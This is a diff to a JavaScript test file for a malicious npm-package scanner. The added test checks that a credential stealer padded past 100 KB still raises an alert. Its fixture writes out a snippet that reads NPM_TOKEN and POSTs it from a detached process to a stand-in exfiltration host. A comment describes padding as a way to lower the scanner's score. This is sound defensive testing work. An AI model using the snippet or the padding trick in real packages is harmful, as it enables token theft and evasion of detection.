@@ -5,7 +5,10 @@
 // flatten a malicious package. Every test starts from a positive case (cap applies) and
 // changes ONE thing, the veto condition. Mutation-checked: removing each veto fails its test.
 
-const { test, assert } = require('../test-utils');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const { test, asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');
 const {
   bundleWithoutInstallScripts,
   mcpServerEnvAccess,
@@ -47,7 +50,7 @@ function cascadeOn(file, extra = []) {
   };
 }
 
-function runFpCapVetoTests() {
+async function runFpCapVetoTests() {
   console.log('\n=== FP CAP VETOES (audit 2026-11) ===\n');
 
   // ---- F15 mcp_server_benign_lifecycle: credential FILE path veto ----
@@ -89,6 +92,35 @@ function runFpCapVetoTests() {
     const r = { threats: [{ type: 'intent_credential_exfil', severity: 'CRITICAL', message: 'package-level intent' }] };
     assert(bundleWithoutInstallScripts(r, { registryMeta: { scripts: {} } }) === false,
       'with no file to look at, "only in bundles" is unproven');
+  });
+
+  // KNOWN LIMIT (measured 2026-11-07). With file sizes, F1 takes any >= 100 KB threat file
+  // with no install hook for a bundle, so padding a stealer moves it from 95 to the F1 cap
+  // of 30: it loses CRITICAL priority but still alerts (>= 20). A HIGH_CONFIDENCE_MALICE
+  // veto was measured and rejected: on the 173 corpus packages it could move, it restored 3
+  // TP + 1 net_new to 100 but pushed 71 FP_probable bundles to >= 75; no type separates the
+  // two groups (injected-bundle malware and benign bundles carry the same types). This test
+  // pins the guarantee that holds: the padded stealer still alerts.
+  await asyncTest('F1 known limit: a stealer padded past 100 KB is capped by F1 but still alerts (>= 20)', async () => {
+    const payload = [
+      'const { spawn } = require("child_process");',
+      'const tok = process.env.NPM_TOKEN;',
+      'spawn(process.execPath, ["-e", "fetch(`https://collector.example-exfil.net/x`,{method:`POST`,body:process.argv[1]})", tok], { detached: true, stdio: "ignore" }).unref();',
+      ''
+    ].join('\n');
+    const scores = {};
+    for (const pad of [false, true]) {
+      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-f1pad-'));
+      try {
+        fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'pad-demo', version: '1.0.0', main: 'index.js' }));
+        fs.writeFileSync(path.join(dir, 'index.js'), payload + (pad ? '/*' + 'x'.repeat(120 * 1024) + '*/\n' : ''));
+        scores[pad] = (await runScanDirect(dir)).summary.riskScore;
+      } finally {
+        cleanupTemp(dir);
+      }
+    }
+    assert(scores.false >= 75, `unpadded stealer should be >= 75, got ${scores.false}`);
+    assert(scores.true >= 20, `padded stealer must still alert (>= 20), got ${scores.true}`);
   });
 
   // ---- F12 vendor_minified_bundle: registry metadata required ----
